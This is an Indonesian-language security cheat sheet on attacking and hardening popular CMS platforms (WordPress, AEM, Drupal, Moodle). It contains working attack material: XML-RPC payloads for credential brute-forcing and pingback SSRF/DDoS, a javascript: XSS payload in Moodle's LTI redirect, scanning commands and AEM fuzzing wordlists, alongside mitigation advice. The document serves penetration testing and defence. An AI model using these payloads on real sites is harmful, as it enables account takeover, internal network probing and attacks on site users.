# ⚙️ CMS (Content Management System) Vulnerabilities

## 1. Definisi
**Content Management System (CMS)** adalah platform perangkat lunak yang memungkinkan pengguna untuk membuat, mengelola, dan mempublikasikan konten di situs web dengan mudah melalui antarmuka grafis (GUI) tanpa perlu menulis kode dari nol. Platform populer seperti WordPress, Drupal, Moodle, dan Adobe Experience Manager (AEM) menguasai sebagian besar ekosistem web global.

Karena kepopulerannya, CMS sering kali menjadi target serangan utama. Kerentanan pada CMS biasanya disebabkan oleh:
* Penggunaan plugin atau tema pihak ketiga yang tidak aman.
* Miskonfigurasi keamanan sistem (seperti membiarkan file administrasi terbuka).
* Tidak memperbarui versi CMS core atau komponen pendukungnya secara berkala.

---

## 2. Pengujian & Eksploitasi Platform CMS Populer

### 🅰️ 1. WordPress
WordPress adalah CMS paling populer di dunia. Dua titik pengujian paling umum:

#### A. Pemindaian Otomatis menggunakan `WPScan`
`wpscan` adalah alat bantu utama untuk mendeteksi kerentanan versi WordPress, tema, dan plugin yang terpasang.
```bash
# Scan dasar dengan deteksi plugin yang rentan
wpscan --url http://target-wordpress.com --enumerate vp,vt,u
```
*(Parameter `vp` menanyakan plugin yang rentan, `vt` menanyakan tema yang rentan, `u` menanyakan daftar nama pengguna).*

#### B. Eksploitasi `xmlrpc.php` (XML-RPC)
API XML-RPC bawaan WordPress sering kali dibiarkan aktif. Celah ini dapat disalahgunakan untuk serangan brute-force massal atau SSRF.

1. **Deteksi Awal**: Kunjungi `http://target.com/xmlrpc.php`. Jika muncul pesan `"XML-RPC server accepts POST requests only."`, maka API ini aktif.
2. **Brute-Force Kredensial (Sangat Cepat)**:
   Kirim POST request ke `/xmlrpc.php` dengan payload berikut:
   ```xml
   <methodCall>
     <methodName>wp.getUsersBlogs</methodName>
     <params>
       <param><value><string>admin</string></value></param>
       <param><value><string>PASSWORD_TEBAKAN</string></value></param>
     </params>
   </methodCall>
   ```
3. **SSRF & DDoS via XML-RPC Pingback**:
   Mengarahkan pingback WordPress ke IP internal untuk mendeteksi port aktif atau ke server luar untuk DDoS:
   ```xml
   <methodCall>
     <methodName>pingback.ping</methodName>
     <params>
       <param><value><string>http://IP_INTERNAL:PORT/</string></value></param>
       <param><value><string>http://target.com/post-valid-wordpress</string></value></param>
     </params>
   </methodCall>
   ```

---

### 🅱️ 2. Adobe Experience Manager (AEM)
AEM adalah CMS kelas enterprise dari Adobe. Banyak instansi besar menggunakannya untuk portal utama.

* **Alat Bantu Pemindaian**:
  - [aem-hacker](https://github.com/0ang3el/aem-hacker) (Untuk mendeteksi miskonfigurasi servlet dan path sensitif).
  - [aemscan](https://github.com/Raz0r/aemscan)
* **Wordlist Jalur Sensitif AEM**:
  Lakukan fuzzing direktori menggunakan daftar path khusus AEM seperti [wordlist_aem.txt](https://raw.githubusercontent.com/clarkvoss/AEM-List/main/paths) untuk menemukan endpoint konfigurasi OSGi console yang terbuka secara publik tanpa otentikasi.

---

### 🅲️ 3. Drupal
Drupal adalah CMS modular yang aman, namun rentan jika konfigurasinya salah atau versinya usang (seperti celah legendaris *Drupalgeddon*).

* **Teknik Fuzzing ID Node**:
  Lakukan enumerasi halaman Drupal dengan melakukan fuzzing ID node pada URL `/node/$` (misalnya `/node/1` hingga `/node/1000`) menggunakan Burp Intruder. Hal ini sering mengungkap halaman draf, halaman development, atau dokumen administrasi internal yang tidak terindeks oleh mesin pencari.

---

### 🅳️ 4. Moodle
Moodle adalah platform Learning Management System (LMS) berbasis web terpopuler di institusi pendidikan.

* **Contoh Eksploitasi Open Redirect & XSS**:
  Menyisipkan payload Javascript pada parameter `redirect_uri` di halaman otentikasi LTI:
  ```http
  https://moodle.target.com/mod/lti/auth.php?redirect_uri=javascript:alert('KamsibXSS')
  ```
* **Pemindaian dengan Nuclei**:
  Gunakan template nuclei khusus untuk mendeteksi kerentanan Moodle secara otomatis:
  ```bash
  nuclei -u https://moodle.target.com -t vulnerabilities/moodle/
  ```

---

## 3. Mitigasi (Pencegahan)

### ✔️ 1. Matikan Layanan xmlrpc.php di WordPress
Jika fitur XML-RPC tidak dibutuhkan (seperti untuk aplikasi mobile WordPress), matikan layanan ini dengan menambahkan aturan konfigurasi pada file `.htaccess`:
```apache
<Files xmlrpc.php>
    Order Deny,Allow
    Deny from all
</Files>
```
Atau pasang plugin keamanan seperti Wordfence.

### ✔️ 2. Lakukan Hardening & Isolasi Console Admin
Pastikan konsol manajemen (seperti OSGi console di AEM, `/admin` di Drupal, `/wp-admin` di WordPress) tidak dapat diakses secara langsung dari IP publik internet. Gunakan pembatasan IP (IP Whitelisting) atau akses hanya via VPN internal perusahaan.

### ✔️ 3. Update Berkala & Hapus Komponen Tidak Dipakai
* Rutin lakukan pembaruan sistem *core* CMS dan seluruh plugin/tema.
* Hapus secara permanen plugin atau tema yang dinonaktifkan (*disabled*) karena kode sumbernya masih bisa diakses secara langsung dan dieksploitasi jika memiliki kerentanan.

---

## 4. Referensi Terpercaya
* [WPScan Official Database](https://wpscan.com/vulnerabilities)
* [Securing AEM Web Applications by Hacking Them (Slideshare)](https://www.slideshare.net/0ang3el/securing-aem-webapps-by-hacking-them)
* [Drupal Security Advisories](https://www.drupal.org/security)
